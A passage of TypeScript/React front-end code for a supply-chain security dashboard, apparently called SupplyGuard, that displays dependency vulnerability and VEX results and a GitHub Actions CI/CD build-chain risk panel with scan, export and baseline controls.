      <span>{label}</span>
      {active ? <CheckCircle2 className='size-3.5' /> : <EyeOff className='size-3.5' />}
    </div>
  )
}

function ReachabilityEvidenceList({
  title,
  items,
}: {
  title: string
  items: NonNullable<SecurityDependency['reachability']>['code_evidence']
}) {
  if (!items?.length) return null
  return (
    <div className='space-y-1.5'>
      <div className='text-xs font-medium text-foreground'>{title}</div>
      {items.slice(0, 3).map((item, index) => (
        <div key={`${title}-${index}-${item.path ?? item.id ?? item.event}`} className='rounded-md bg-muted/35 px-2 py-1.5 text-[11px] leading-5 text-muted-foreground'>
          <div className='truncate font-mono'>
            {item.path ? `${item.path}${item.line ? `:${item.line}` : ''}` : item.rule_id || item.id || item.source || 'evidence'}
          </div>
          <div className='line-clamp-2'>
            {item.snippet || item.evidence || item.event || item.kind || '-'}
          </div>
        </div>
      ))}
    </div>
  )
}

function versionSourceLabel(source: string | undefined) {
  if (source === 'lockfile') return '锁文件'
  if (source === 'environment') return '环境冻结'
  if (source === 'sbom') return 'SBOM'
  if (source === 'osv') return 'OSV'
  return 'Manifest'
}

function dependencyKey(dependency: SecurityDependency) {
  return `${dependency.ecosystem}-${dependency.name}-${dependency.version}-${dependency.source_file ?? dependency.manifest_type ?? ''}`
}

function dependencyPanelStats(
  audit: DependencyAuditResult | null | undefined,
  dependencies: SecurityDependency[],
  supplyFindings: SecurityFinding[]
) {
  const totalDependencies = audit?.summary.total_dependencies ?? dependencies.length
  const riskyDependencyKeys = new Set(
    dependencies
      .filter(
        (dependency) =>
          dependency.risk >= 50 ||
          (dependency.signals?.length ?? 0) > 0 ||
          (dependency.vulnerabilities?.length ?? 0) > 0 ||
          dominantVexStatus(dependency) === 'affected'
      )
      .map(dependencyKey)
  )
  const signalCountFromDependencies = dependencies.reduce((count, dependency) => {
    const dependencySignals = dependency.signals?.length ?? 0
    const vulnerabilitySignals = dependency.vulnerabilities?.length ?? 0
    return count + dependencySignals + vulnerabilitySignals
  }, 0)
  const maxDependencyRisk = dependencies.reduce((maxRisk, dependency) => Math.max(maxRisk, dependency.risk ?? 0), 0)

  return {
    totalDependencies,
    riskyDependencies: riskyDependencyKeys.size,
    riskSignals: audit?.summary.finding_count ?? (supplyFindings.length || signalCountFromDependencies),
    maxRisk: maxDependencyRisk || audit?.summary.risk_score || 0,
  }
}

function dependencySeverity(risk: number): SecuritySeverity {
  if (risk >= 90) return 'critical'
  if (risk >= 75) return 'high'
  if (risk >= 60) return 'medium'
  return 'low'
}

function dominantVexStatus(dependency: SecurityDependency): VexStatus | null {
  const statuses = (dependency.vex ?? []).map((statement) => statement.status).filter(Boolean)
  if (!statuses.length) return null
  if (statuses.includes('affected')) return 'affected'
  if (statuses.includes('under_investigation')) return 'under_investigation'
  if (statuses.includes('not_affected')) return 'not_affected'
  return 'fixed'
}

function vexStatusLabel(status: VexStatus) {
  if (status === 'affected') return '受影响'
  if (status === 'not_affected') return '暂未受影响'
  if (status === 'under_investigation') return '待研判'
  return '已修复'
}

function vexStatusClass(status: VexStatus) {
  if (status === 'affected') return severityClasses.critical
  if (status === 'under_investigation') return severityClasses.medium
  if (status === 'not_affected') return statusClasses.active
  return severityClasses.low
}

function dependencyRecommendationText(dependency: SecurityDependency) {
  const status = dominantVexStatus(dependency)
  const reachability = dependency.reachability
  const parts: string[] = []

  if (status === 'affected') {
    parts.push('建议优先处置：该组件存在可利用风险')
  } else if (status === 'under_investigation') {
    parts.push('建议继续研判：该组件存在漏洞或异常信号')
  } else if (status === 'not_affected') {
    parts.push('暂未发现直接影响：保留为低优先级跟踪')
  } else if (status === 'fixed') {
    parts.push('当前版本已有修复记录，建议确认锁文件与产物版本一致')
  } else if (dependency.risk >= 80) {
    parts.push('建议重点关注：该组件风险分较高')
  } else {
    parts.push('建议持续观察：当前证据不足以判定为核心攻击入口')
  }

  const reasons: string[] = []
  if ((dependency.vulnerabilities?.length ?? 0) > 0) reasons.push('命中公开漏洞')
  if (reachability?.imported || reachability?.called) reasons.push('代码中存在调用证据')
  if (reachability?.attack_surface) reasons.push('关联服务暴露面')
  if (reachability?.runtime_trace) reasons.push('日志中出现运行痕迹')
  if (dependency.signals.some((signal) => signal.toLowerCase().includes('install script'))) reasons.push('包含安装脚本风险')
  if (dependency.license === 'UNKNOWN') reasons.push('许可证未知')

  if (reasons.length) {
    parts.push(`依据：${reasons.slice(0, 4).join('、')}。`)
  }

  return parts.join('，')
}

function vexStatementText(dependency: SecurityDependency, statement: NonNullable<SecurityDependency['vex']>[number]) {
  if (statement.status === 'affected') {
    const evidence: string[] = []
    if (statement.reachability?.imported || dependency.reachability?.imported) evidence.push('代码已调用')
    if (statement.reachability?.runtime_trace || dependency.reachability?.runtime_trace) evidence.push('日志有痕迹')
    if (statement.reachability?.attack_surface || dependency.reachability?.attack_surface) evidence.push('存在暴露面')
    return evidence.length
      ? `该漏洞在当前项目中可能有影响，证据包括：${evidence.join('、')}。`
      : '该漏洞被判定为可能影响当前项目，建议优先核查调用路径和运行环境。'
  }
  if (statement.status === 'fixed') {
    return '当前版本被判定为已修复或不在受影响范围内，建议继续确认锁文件和构建产物版本。'
  }
  if (statement.status === 'not_affected') {
    return '当前证据显示暂未直接影响本项目，可降低优先级并保留跟踪。'
  }
  return '证据尚不足以定性，建议结合调用路径、服务暴露面和运行日志继续研判。'
}

function localizedFindingTitle(title: string) {
  return title
    .replace('has exploitable VEX context', '存在可利用 VEX 上下文')
    .replace('vulnerability needs triage', '漏洞需要研判')
    .replace('suspicious dependency', '可疑依赖')
    .replace('install script', '安装脚本风险')
}

function summarizeFindingEvidence(evidence: string) {
  const osvCount = (evidence.match(/OSV:/g) ?? []).length
  const parts: string[] = []

  if (osvCount) parts.push(`命中 ${osvCount} 个 OSV 漏洞编号`)
  if (/exact version from lockfile/i.test(evidence)) parts.push('版本来自锁文件')
  if (/exact version from environment/i.test(evidence)) parts.push('版本来自环境冻结')
  if (/reachable import detected/i.test(evidence)) parts.push('检测到代码调用')
  if (/runtime exploit trace matched/i.test(evidence)) parts.push('匹配运行日志证据')
  if (/VEX:\s*affected/i.test(evidence)) parts.push('VEX 判定为受影响')
  if (/VEX:\s*fixed/i.test(evidence)) parts.push('包含已修复判断')
  if (/VEX:\s*under_investigation/i.test(evidence)) parts.push('仍需继续研判')
  if (/unknown license/i.test(evidence)) parts.push('许可证未知')
  if (/install script/i.test(evidence)) parts.push('包含安装脚本')
  if (/transitive dependency/i.test(evidence)) parts.push('属于传递依赖')

  return parts.length ? `${parts.slice(0, 5).join('；')}。` : evidence
}

function severityLabel(severity: SecuritySeverity) {
  if (severity === 'critical') return '严重'
  if (severity === 'high') return '高危'
  if (severity === 'medium') return '中危'
  return '低危'
}

function PipelinePanel({
  pipeline,
  audit,
  artifactTrust,
  workspaceId,
  importId,
  onScanned,
  onSupplementProjectArchive,
}: {
  pipeline: SecurityPipelineStep[]
  audit?: CICDAuditResult | null
  artifactTrust?: ArtifactTrustResult | null
  workspaceId?: string
  importId?: string
  onScanned: (audit: CICDAuditResult) => void
  onSupplementProjectArchive: (file: File) => Promise<void>
}) {
  const [scanning, setScanning] = useState(false)
  const [supplementing, setSupplementing] = useState(false)
  const [mutating, setMutating] = useState(false)
  const [selectedFindingId, setSelectedFindingId] = useState<string | null>(null)
  const [severityFilter, setSeverityFilter] = useState('all')
  const [workflowFilter, setWorkflowFilter] = useState('all')
  const supplementInputRef = useRef<HTMLInputElement>(null)
  const displayModel = useMemo(() => buildCicdDisplayModel({ audit, pipeline, artifactTrust }), [audit, pipeline, artifactTrust])
  const findings = displayModel.findings
  const workflows = displayModel.workflows
  const corePipeline = useMemo(() => buildCoreCicdPipeline(pipeline), [pipeline])
  const displayAudit = useMemo<CICDAuditResult>(() => ({
    scan_id: audit?.scan_id ?? artifactTrust?.scan_id ?? null,
    generated_at: audit?.generated_at ?? artifactTrust?.generated_at,
    target_path: audit?.target_path,
    target: audit?.target,
    workflows,
    summary: displayModel.summary,
    findings,
    scanners: audit?.scanners,
    sarif: audit?.sarif,
    state: audit?.state,
    report: audit?.report ?? artifactTrust?.report ?? '',
    warnings: [...(audit?.warnings ?? []), ...(artifactTrust?.warnings ?? [])],
  }), [audit, artifactTrust, displayModel.summary, findings, workflows])
  const conclusion = buildCicdConclusion(displayAudit, corePipeline, findings)
  const filteredFindings = findings.filter((finding) => {
    if (severityFilter !== 'all' && finding.severity !== severityFilter) return false
    if (workflowFilter !== 'all' && finding.workflow !== workflowFilter) return false
    return true
  })
  const selectedFinding = selectedFindingId ? filteredFindings.find((finding) => finding.fingerprint === selectedFindingId) : undefined

  useEffect(() => {
    if (selectedFindingId && !filteredFindings.some((finding) => finding.fingerprint === selectedFindingId)) {
      setSelectedFindingId(filteredFindings[0]?.fingerprint ?? null)
    }
  }, [filteredFindings, selectedFindingId])

  useEffect(() => {
    setSeverityFilter('all')
    setWorkflowFilter('all')
    setSelectedFindingId(findings[0]?.fingerprint ?? null)
  }, [displayModel.scanKey])

  function selectFinding(finding: CicdFinding) {
    setSelectedFindingId(finding.fingerprint)
  }

  function resetCicdView() {
    setSeverityFilter('all')
    setWorkflowFilter('all')
    setSelectedFindingId(findings[0]?.fingerprint ?? null)
  }

  async function startCICDScan() {
    setScanning(true)
    try {
      const nextAudit = await runCICDAuditScan({ workspaceId, importId, targetPath: importId ? undefined : audit?.target_path })
      onScanned(nextAudit)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'CI/CD 扫描失败')
    } finally {
      setScanning(false)
    }
  }

  async function handleSupplementFileChange(event: ChangeEvent<HTMLInputElement>) {
    const file = event.target.files?.[0]
    event.target.value = ''
    if (!file) return
    if (!isSupplementProjectArchive(file.name)) {
      toast.error('请选择 .zip、.tar.gz 或 .tgz 项目压缩包')
      return
    }
    setSupplementing(true)
    try {
      await onSupplementProjectArchive(file)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '补充文件处理失败')
    } finally {
      setSupplementing(false)
    }
  }

  async function downloadSarif() {
    try {
      const sarif = audit?.sarif ?? (await loadCICDAuditSarif())
      downloadJson(sarif, 'supplyguard-cicd-audit.sarif')
      toast.success('CI/CD SARIF 已导出')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'CI/CD SARIF 导出失败')
    }
  }

  async function establishBaseline() {
    if (!audit) return
    setMutating(true)
    try {
      const payload = await createCICDAuditBaseline('accepted-current-cicd-risk')
      if (payload.cicd_audit) onScanned(payload.cicd_audit)
      toast.success('CI/CD 基线已建立')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '建立 CI/CD 基线失败')
    } finally {
      setMutating(false)
    }
  }

  async function ignoreFinding(fingerprint: string) {
    setMutating(true)
    try {
      const payload = await ignoreCICDAuditFinding(fingerprint, 'false-positive')
      if (payload.cicd_audit) onScanned(payload.cicd_audit)
      toast.success('已忽略 CI/CD 误报')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '忽略 CI/CD 风险失败')
    } finally {
      setMutating(false)
    }
  }

  async function uploadGithubCodeScanning() {
    if (!audit) return
    setMutating(true)
    try {
      const result = await uploadCICDAuditToGitHubCodeScanning({
        owner: 'HEIBAI198',
        repo: 'Sysml',
        ref: 'refs/heads/main',
      })
      toast.success(`CI/CD SARIF 已提交 GitHub Code Scanning: ${result.status}`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'CI/CD Code Scanning 上传失败')
    } finally {
      setMutating(false)
    }
  }

  const totalBuildChainRisks = displayModel.summary.finding_count
  const hasScanResult = Boolean(audit?.scan_id || audit?.generated_at)
  const scanGeneratedAt = formatLocalDateTime(audit?.generated_at, { fallback: '' })

  return (
    <div className='space-y-4'>
      <input ref={supplementInputRef} type='file' accept={SUPPLEMENT_PROJECT_ARCHIVE_ACCEPT} className='hidden' onChange={(event) => void handleSupplementFileChange(event)} />
      <section className='rounded-md border border-border bg-[color:var(--surface-card)] p-4'>
        <div className='flex flex-wrap items-start justify-between gap-4'>
          <div className='min-w-0'>
            <div className='flex items-center gap-3'>
              <span className='grid size-9 place-items-center rounded-md border border-orange-300/25 bg-orange-400/10 text-orange-100'>
                <GitBranch className='size-5' />
              </span>
              <h2 className='text-page-title text-page-title-on-dark'>CI/CD 构建链研判</h2>
            </div>
            <div className='mt-2 h-px w-56 bg-gradient-to-r from-orange-300/55 via-orange-300/20 to-transparent' />
            <div className='mt-3 flex flex-wrap items-center gap-2'>
              <span className='meta-chip-dark'>GitHub Actions</span>
              {displayModel.hasBuildChainEvidence ? (
                <>
                  <span className='meta-chip-dark'>{displayModel.summary.workflow_count} workflows</span>
                  <span className='meta-chip-dark'>{displayModel.summary.total_steps} steps</span>
                  <span className='meta-chip-dark'>{totalBuildChainRisks} 风险</span>
                </>
              ) : (
                <span className='inline-flex items-center rounded-full border border-amber-400/30 bg-amber-400/10 px-2.5 py-1 text-xs font-semibold text-amber-700 dark:text-amber-200'>
                  {hasScanResult ? '未发现工作流' : '等待扫描'}
                </span>
              )}
            </div>
          </div>
          {displayModel.hasBuildChainEvidence ? (
            <div className='flex flex-wrap gap-2'>
              <Button size='sm' className={actionButtonClass} onClick={() => void startCICDScan()} disabled={scanning}>
                {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
                重新扫描
              </Button>
              <Button size='sm' variant='outline' onClick={() => supplementInputRef.current?.click()} disabled={supplementing}>
                {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
                {SUPPLEMENT_FILE_LABEL}
              </Button>
              <Button size='sm' variant='outline' onClick={() => downloadReport(audit?.report || artifactTrust?.report || '# CI/CD 构建流程风险报告\n\n尚未执行扫描。')}>
                <Download className='size-4' />
                导出报告
              </Button>
            </div>
          ) : null}
        </div>
      </section>

      {displayModel.hasBuildChainEvidence ? (
        <div className='space-y-4'>
          <CicdRiskOverviewCard model={displayModel} />
          <div className='grid min-w-0 gap-4 xl:grid-cols-[minmax(0,1.65fr)_minmax(340px,0.85fr)]'>
            <CicdFindingNameList
              findings={filteredFindings}
              totalCount={findings.length}
              selectedFinding={selectedFinding}
              workflows={workflows}
              severityFilter={severityFilter}
              workflowFilter={workflowFilter}
              onSeverityFilter={setSeverityFilter}
              onWorkflowFilter={setWorkflowFilter}
              onReset={resetCicdView}
              onSelect={selectFinding}
            />
            <CicdFindingDetailPanel
              finding={selectedFinding}
              totalCount={filteredFindings.length}
              disabled={mutating}
              onIgnore={(finding) => void ignoreFinding(finding.fingerprint)}
            />
          </div>
        </div>
      ) : (
        <CicdEmptyState
          hasScanResult={hasScanResult}
          scanGeneratedAt={scanGeneratedAt}
          scanning={scanning}
          supplementing={supplementing}
          onScan={() => void startCICDScan()}
          onSupplement={() => supplementInputRef.current?.click()}
        />
      )}

    </div>
  )
}

function CicdEmptyState({
  hasScanResult,
  scanGeneratedAt,
  scanning,
  supplementing,
  onScan,
  onSupplement,
}: {
  hasScanResult: boolean
  scanGeneratedAt: string
  scanning: boolean
  supplementing: boolean
  onScan: () => void
  onSupplement: () => void
}) {
  return (
    <section className='overflow-hidden rounded-md border border-border bg-[color:var(--surface-card)]'>
      <div className='mx-auto flex min-h-[390px] max-w-3xl flex-col items-center justify-center px-6 py-14 text-center'>
        <span className='grid size-14 place-items-center rounded-md border border-cyan-400/25 bg-cyan-400/10 text-cyan-700 dark:text-cyan-200'>
          <FileSearch className='size-7' />
        </span>
        <h3 className='mt-5 text-xl font-bold text-foreground'>
          {hasScanResult ? '未发现 GitHub Actions 工作流' : '尚未检测 CI/CD 工作流'}
        </h3>
        <p className='mt-2 max-w-xl text-sm leading-6 text-muted-foreground'>
          {hasScanResult
            ? '当前项目中没有可研判的 workflow 配置，因此暂不生成风险评分和风险详情。'
            : '扫描项目中的 workflow 配置后，才能分析权限、Action 引用、Runner 和构建步骤风险。'}
        </p>
        <div className='mt-6 flex flex-wrap items-center justify-center gap-2'>
          <Button className={actionButtonClass} onClick={onSupplement} disabled={supplementing}>
            {supplementing ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
            上传项目压缩包
          </Button>
          <Button variant='outline' onClick={onScan} disabled={scanning}>
            {scanning ? <Loader2 className='size-4 animate-spin' /> : <RefreshCw className='size-4' />}
            重新扫描
          </Button>
        </div>
      </div>

      <div className='grid border-t border-border bg-[color:var(--surface-inset)] md:grid-cols-2'>
        <div className='flex min-w-0 items-start gap-3 border-b border-border px-5 py-4 md:border-r md:border-b-0'>
          <FolderOpen className='mt-0.5 size-4 shrink-0 text-cyan-700 dark:text-cyan-300' />
          <div className='min-w-0'>
            <div className='text-xs font-semibold text-foreground'>检测位置</div>
            <div className='mt-1 truncate font-mono text-xs text-muted-foreground' title='.github/workflows/*.yml、*.yaml'>
              .github/workflows/*.yml、*.yaml
            </div>
          </div>
        </div>
        <div className='flex min-w-0 items-start gap-3 px-5 py-4'>
          <CheckCircle2 className='mt-0.5 size-4 shrink-0 text-emerald-700 dark:text-emerald-300' />
          <div className='min-w-0'>
            <div className='text-xs font-semibold text-foreground'>检测状态</div>
            <div className='mt-1 text-xs text-muted-foreground'>
              {hasScanResult ? `扫描已完成${scanGeneratedAt ? ` · ${scanGeneratedAt}` : ''}` : '等待首次扫描'}
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

type CicdFinding = CICDAuditResult['findings'][number]

type BuildChainStep = {
  index: number
  title: string
  mainEntity: string
  description: string
  time: string
  source: string
  riskLevel: SecuritySeverity | 'normal'
  status: string
  stepData: SecurityPipelineStep | null
  relatedFindings: CicdFinding[]
  riskCount: number
}

/* ── Build ordered build chain steps from pipeline ── */
const BUILD_STEP_ORDER: Record<string, { title: string; index: number }> = {
  commit:    { title: '代码提交',           index: 1 },
  workflow:  { title: '工作流定义',         index: 2 },
  build:     { title: '构建环境',           index: 3 },
  artifact:  { title: '产物生成',           index: 4 },
  attestation: { title: '来源证明',         index: 5 },
  deploy:    { title: '产物发布',           index: 6 },
  'runtime-correlation': { title: '运行期证据关联', index: 7 },
}

function buildOrderedBuildSteps(
  pipeline: SecurityPipelineStep[],
  findings: CicdFinding[],
): BuildChainStep[] {
  // Group pipeline steps by step type, take latest for each unique step
  const seen = new Map<string, SecurityPipelineStep>()
  for (const s of pipeline) {
    if (BUILD_STEP_ORDER[s.step]) {
      const existing = seen.get(s.step)
      if (!existing || (s.time || '') > (existing.time || '')) {
        seen.set(s.step, s)
      }
    }
  }

  // ALWAYS generate all 7 defined steps, even if pipeline data is missing
  const steps: BuildChainStep[] = []
  for (const [stepType, def] of Object.entries(BUILD_STEP_ORDER)) {
    const s = seen.get(stepType)  // may be undefined if step not in pipeline
    const related = findings.filter(f => {
      const ids = cicdFindingNodeIds(f)
      return ids.includes(stepType) || (s ? ids.includes(s.step) : false)
    })
    const riskScore = related.reduce((max, f) => Math.max(max, f.score), 0)
    const riskLevel: SecuritySeverity | 'normal' =
      riskScore >= 90 ? 'critical' : riskScore >= 75 ? 'high' : riskScore >= 55 ? 'medium' : related.length > 0 ? 'low' : 'normal'

    steps.push({
      index: def.index,
      title: def.title,
      mainEntity: s?.name || s?.step || '—',
      description: s?.detail || s?.actor || '等待扫描数据',
      time: formatLocalDateTime(s?.time, { fallback: '' }),
      source: s?.actor || stepType,
      riskLevel,
      status: s?.status || 'waiting',
      stepData: s || null,
      relatedFindings: related,
      riskCount: related.length,
    })
  }

  return steps.sort((a, b) => a.index - b.index)
}

function CicdConclusionStrip({
  conclusion,
  audit,
  findings,
}: {
  conclusion: ReturnType<typeof buildCicdConclusion>
  audit: CICDAuditResult
  findings: CicdFinding[]
}) {
  const primary = conclusion.keyRisks[0] ?? cicdFindingTitle(findings[0]) ?? '未发现高优先级风险'
  return (
    <div className='mt-3 flex flex-wrap items-center gap-x-4 gap-y-1 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] px-3 py-2 text-xs'>
      <span className='rounded-full border border-orange-300/30 bg-orange-400/10 px-2 py-0.5 text-[11px] font-semibold text-orange-100 shrink-0'>构建链风险</span>
      <span className='text-muted-foreground truncate min-w-0'>
        主要风险：<span className='font-semibold text-foreground'>{primary}</span>
        {findings.length > 1 && <span className='text-muted-foreground'> +{findings.length - 1} 项</span>}
      </span>
      <span className='text-muted-foreground shrink-0'>
        {audit.workflows?.length || audit.summary.workflow_count || 0} workflows · {audit.summary.total_steps || audit.summary.job_count || 0} steps · <span className='font-semibold text-orange-100'>{findings.length}</span> 条风险
      </span>
    </div>
  )
}

function CicdRiskOverviewCard({
  model,
}: {
  model: CicdDisplayModel
}) {
  const riskScore = model.summary.risk_score
  const riskLevel = model.summary.risk_level
  const { value: displayScore } = useAnimatedNumber(riskScore, {
    stiffness: 90,
    damping: 18,
    delayMs: 120,
    durationMs: 1500,
    respectReducedMotion: false,
    resetKey: model.scanKey,
  })
  const severityData = [
    { label: '严重', value: model.summary.critical, color: 'bg-red-400' },
    { label: '高危', value: model.summary.high, color: 'bg-orange-400' },
    { label: '中危', value: model.summary.medium, color: 'bg-amber-300' },
    { label: '低危', value: model.summary.low, color: 'bg-cyan-300' },
  ]
  const riskTotal = Math.max(1, severityData.reduce((sum, item) => sum + item.value, 0))
  const scoreTone = {
    critical: 'text-red-600 dark:text-red-300',
    high: 'text-orange-600 dark:text-orange-300',
    medium: 'text-amber-600 dark:text-amber-300',
    low: 'text-emerald-600 dark:text-emerald-300',
  }[riskLevel]
  const metrics = [
    { label: 'Workflows', value: model.summary.workflow_count },
    { label: 'Jobs', value: model.summary.job_count },
    { label: 'Steps', value: model.summary.total_steps },
    { label: '风险发现', value: model.summary.finding_count },
  ]

  return (
    <Card className='overflow-hidden rounded-md border-border bg-[color:var(--surface-card)] shadow-none' style={{ boxShadow: 'none' }}>
      <CardContent className='p-0'>
        <div className='grid lg:grid-cols-[230px_minmax(0,1fr)]'>
          <div className='flex items-center gap-4 border-b border-border px-5 py-5 lg:border-r lg:border-b-0'>
            <span className='grid size-10 shrink-0 place-items-center rounded-md border border-orange-400/25 bg-orange-500/10 text-orange-700 dark:text-orange-200'>
              <ShieldAlert className='size-5' />
            </span>
            <div className='min-w-0'>
              <div className='flex items-end gap-2'>
                <span className={cn('text-4xl font-bold leading-none tabular-nums', scoreTone)}>{displayScore}</span>
                <span className='pb-0.5 text-xs font-medium text-muted-foreground'>/ 100</span>
              </div>
              <div className='mt-2 flex items-center gap-2'>
                <span className='text-xs font-semibold text-foreground'>综合风险评分</span>
                <SeverityPill severity={riskLevel} />
              </div>
            </div>
          </div>

          <div className='min-w-0 px-5 py-4'>
            <div className='grid grid-cols-2 sm:grid-cols-4 sm:divide-x sm:divide-border'>
              {metrics.map((metric) => (
                <div key={metric.label} className='min-w-0 px-4 first:pl-0 last:pr-0'>
                  <div className='text-xs font-medium text-muted-foreground'>{metric.label}</div>
                  <div className='mt-1 text-2xl font-bold tabular-nums text-foreground'>{metric.value}</div>
                </div>
              ))}
            </div>
            <div className='mt-4 border-t border-border pt-3'>
              <div className='flex h-1.5 overflow-hidden rounded-full bg-[color:var(--muted)]'>
                {severityData.filter((item) => item.value > 0).map((item) => (
                  <span
                    key={item.label}
                    className={item.color}
                    style={{ width: `${(item.value / riskTotal) * 100}%` }}
                  />
                ))}
              </div>
              <div className='mt-2 flex flex-wrap items-center gap-x-5 gap-y-1 text-xs text-muted-foreground'>
                {severityData.map((item) => (
                  <span key={item.label} className='inline-flex items-center gap-1.5 tabular-nums'>
                    <span className={cn('size-2 rounded-sm', item.color)} />
                    {item.label} {item.value}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

/* ── Step Flow Graph: build chain steps only ── */
function BuildStepFlow({
  steps,
  activeStepIndex,
  onSelectStep,
}: {
  steps: BuildChainStep[]
  activeStepIndex: number | null
  onSelectStep: (index: number) => void
}) {
  const sevColors: Record<string, string> = {
    critical: 'border-red-300 bg-red-50 text-red-700 dark:border-red-500/40 dark:bg-red-950/30 dark:text-red-300',
    high: 'border-orange-300 bg-orange-50 text-orange-700 dark:border-orange-500/40 dark:bg-orange-950/30 dark:text-orange-300',
    medium: 'border-amber-300 bg-amber-50 text-amber-700 dark:border-amber-500/40 dark:bg-amber-950/30 dark:text-amber-300',
    low: 'border-slate-300 bg-slate-50 text-slate-600 dark:border-slate-500/30 dark:bg-slate-900/40 dark:text-muted-foreground',
    normal: 'border-slate-200 bg-white/60 text-slate-500 dark:border-slate-500/20 dark:bg-slate-900/30 dark:text-muted-foreground',
  }

  return (
    <Card className='h-full min-h-[390px] surface-raised flex flex-col'>
      <CardHeader className='pb-2 shrink-0'>
        <CardTitle className='flex items-center gap-2 text-sm font-bold'><GitBranch className='size-4 text-cyan-600 dark:text-cyan-400' />构建链路图</CardTitle>
      </CardHeader>
      <CardContent className='flex-1 min-h-0 overflow-hidden px-3'>
        <div className='h-full overflow-x-auto pb-3 snap-x snap-mandatory [scrollbar-width:thin]'>
          <div className='relative flex items-stretch gap-3 min-w-max py-4 pl-1 pr-4'>
            {/* Connection line */}
            <div className='absolute left-10 right-10 top-[calc(50%+2px)] h-0.5 -translate-y-1/2 bg-gradient-to-r from-slate-200 via-slate-300 to-slate-200 dark:from-slate-700/40 dark:via-slate-600/60 dark:to-slate-700/40' />
            {/* Active progress line */}
            {activeStepIndex != null && (
              <div
                className='absolute left-10 top-[calc(50%+2px)] h-0.5 -translate-y-1/2 bg-gradient-to-r from-cyan-400/50 to-orange-400/40 dark:from-cyan-500/60 dark:to-orange-400/50 transition-all duration-500'
                style={{ width: `calc((100% - 5rem) * ${activeStepIndex / Math.max(1, steps.length - 1)})` }}
              />
            )}

            {steps.map((step, i) => {
              const active = activeStepIndex === step.index
              const s = sevColors[step.riskLevel] || sevColors.normal
              return (
                <UiTooltip key={step.index}>
                  <UiTooltipTrigger asChild>
                    <motion.button
                      type='button'
                      initial={{ opacity: 0, y: 12 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.28, delay: i * 0.05 }}
                      onClick={() => onSelectStep(step.index)}
                      className={cn(
                        'relative z-10 flex shrink-0 flex-col items-center justify-center gap-2 rounded-xl border w-[148px] h-[130px] px-3 py-3 transition-all duration-300 snap-start',
                        'hover:-translate-y-1 hover:shadow-lg active:scale-[0.98]',
                        active
                          ? 'border-cyan-300 bg-cyan-50 shadow-[0_0_20px_rgba(6,182,212,0.15)] dark:border-cyan-400/50 dark:bg-cyan-950/30 dark:shadow-[0_0_20px_rgba(6,182,212,0.12)]'
                          : `${s} hover:border-slate-300 dark:hover:border-white/10`,
                      )}
                    >
                      {/* Step number */}
                      <span className={cn(
                        'grid size-8 shrink-0 place-items-center rounded-full text-[11px] font-black tabular-nums',
                        active ? 'bg-cyan-100 text-cyan-700 ring-1 ring-cyan-300 dark:bg-cyan-500/20 dark:text-cyan-300 dark:ring-cyan-400/30' : 'bg-slate-100 text-slate-500 dark:bg-slate-800/60 dark:text-muted-foreground',
                      )}>
                        {step.index}
                      </span>
                      {/* Title — always 1 line, truncated */}
                      <span
                        className={cn(
                          'w-full text-center text-[13px] font-bold leading-tight truncate',
                          active ? 'text-foreground' : 'text-muted-foreground',
                        )}
                        title={step.title}
                      >
                        {step.title}
                      </span>
                      {/* Risk indicator or placeholder to keep height consistent */}
                      <span className={cn(
                        'inline-flex h-5 items-center rounded-full px-2 text-[10px] font-bold shrink-0',
                        step.riskLevel !== 'normal' ? s : 'text-transparent',
                      )}>
                        {step.riskLevel !== 'normal' ? `${step.riskCount} 风险` : ' '}
                      </span>
                    </motion.button>
                  </UiTooltipTrigger>
                  <UiTooltipContent>
                    <div className='space-y-1 text-xs max-w-[220px]'>
                      <div className='font-bold'>{step.title}</div>
                      <div className='text-muted-foreground break-all'>{step.mainEntity}</div>
                      {step.description && <div className='text-muted-foreground line-clamp-2'>{step.description}</div>}
                      <div>{step.time}</div>
                    </div>
                  </UiTooltipContent>
                </UiTooltip>
              )
            })}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

/* ── Step Detail Card ── */
function BuildStepDetail({
  step,
  audit,
}: {
  step?: BuildChainStep
  audit?: CICDAuditResult | null
}) {
  if (!step) {
    return (
      <Card className='h-full min-h-[390px] surface-raised flex items-center justify-center'>
        <p className='text-sm text-muted-foreground'>点击上方步骤查看详情</p>
      </Card>
    )
  }

  const findings = step.relatedFindings
  const uniqueWorkflows = [...new Set(findings.map(f => f.workflow).filter(Boolean))]
  const uniqueJobs = [...new Set(findings.map(f => f.job_id || f.job_name).filter(Boolean))]

  return (
    <motion.div
      key={step.index}
      className='h-full'
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.22 }}
    >
      <Card className='h-full min-h-[390px] surface-raised overflow-y-auto flex flex-col'>
        <CardHeader className='pb-3 shrink-0'>
          <div className='flex items-center gap-2.5'>
            <span className='grid size-8 shrink-0 place-items-center rounded-lg bg-cyan-100 text-xs font-black text-cyan-700 ring-1 ring-cyan-300 dark:bg-cyan-950/50 dark:text-cyan-300 dark:ring-cyan-500/20'>
              {step.index}
            </span>
            <div className='min-w-0'>
              <div className='text-[10px] text-muted-foreground uppercase tracking-wider'>构建链步骤</div>
              <CardTitle className='text-base font-bold truncate' title={step.title}>{step.title}</CardTitle>
            </div>
          </div>
        </CardHeader>
        <CardContent className='space-y-3 flex-1'>
          {/* Status badges */}
          <div className='flex flex-wrap gap-1.5'>
            <span className={cn(
              'rounded-full border px-2 py-0.5 text-[10px] font-bold shrink-0',
              step.riskLevel === 'critical' ? 'border-red-300 bg-red-50 text-red-700 dark:border-red-500/30 dark:bg-red-950/30 dark:text-red-300' :
              step.riskLevel === 'high' ? 'border-orange-300 bg-orange-50 text-orange-700 dark:border-orange-500/30 dark:bg-orange-950/30 dark:text-orange-300' :
